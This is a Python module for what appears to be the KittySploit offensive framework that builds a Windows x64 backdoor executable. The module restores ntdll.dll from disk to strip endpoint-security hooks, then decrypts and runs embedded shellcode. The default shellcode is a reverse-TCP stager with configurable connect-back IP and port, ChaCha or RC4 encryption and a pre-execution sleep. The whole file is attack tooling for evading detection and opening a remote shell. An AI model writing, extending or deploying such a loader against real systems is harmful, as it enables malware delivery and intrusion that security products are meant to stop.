#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.compile.backdoor_helpers import build_encrypted_zig_backdoor, option_value
from lib.compile.ntdll_unhooking_loader import NtdllUnhookingLoaderBuilder


class Module(Backdoor):
    __info__ = {
        "name": "ntdll Unhooking Loader Evasion",
        "description": (
            "Restore ntdll.dll .text from disk to strip userland hooks, then decrypt and "
            "run embedded shellcode via VirtualAlloc/CreateThread."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://github.com/JoasASantos/Awesome-EDR-Evasion/blob/main/Codes/06_ntdll_unhooking.c",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP", True)
    lport = OptPort(4444, "Connect-back port", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    cipher = OptChoice("chacha", "Shellcode encryption", True, ["chacha", "rc4"])
    sleep = OptInteger(10000, "Sleep ms before shellcode", False)
    output_name = OptString("ntdll_unhook.exe", "Output filename", False)
    optimization = OptChoice("ReleaseSmall", "Zig optimization", False, ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"])
    save_source = OptBool(False, "Save C source", False, advanced=True)
    windows_subsystem = OptChoice("windows", "PE subsystem", False, ["windows", "console"])

    def run(self):
        builder = NtdllUnhookingLoaderBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        return build_encrypted_zig_backdoor(
            self,
            builder,
            output_name="ntdll_unhook.exe",
            save_source_name="ntdll_unhook.zig",
        )
